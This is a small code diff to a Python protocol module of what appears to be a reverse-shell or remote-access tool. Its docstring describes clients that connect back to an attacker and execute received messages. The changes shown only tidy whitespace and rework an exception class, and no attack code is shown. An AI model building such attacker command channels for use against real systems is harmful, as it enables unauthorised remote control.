@@ -4,10 +4,10 @@
 The protocol module.
 ======================
 
-The module to create protocol messages. A message is basically composed of a code, 
-the message content and aditional parameters. The protocol is designed for reverse tcp connections, 
+The module to create protocol messages. A message is basically composed of a code,
+the message content and aditional parameters. The protocol is designed for reverse tcp connections,
 where the client connects back to the attacker and acts like a server, receiving messages, executing
-and sending the proper response. 
+and sending the proper response.
 
 :Example:
 
@@ -107,7 +107,7 @@ def build_packet(code, content=None, params={}):
     :return: The data encoded.
     """
     if not __is_code_valid(code):
-        raise InvalidPacketCode(code)
+        raise InvalidPacketCode('Invalid packet code. Code: {}'.format(code))
 
     # Parse params as HTTP query string.
     params = urllib.parse.urlencode(params)
@@ -166,8 +166,8 @@ class MalformedPacketException(Exception):
         return str(self.message)
 
 class InvalidPacketCode(Exception):
-    def __init__(self, code):
-        self.code = code
+    def __init__(self, message):
+        self.message = message
 
     def __repr__(self):
-        return 'Invalid code for packet. Code given: {}'.format(self.code)
+        return str(self.message)
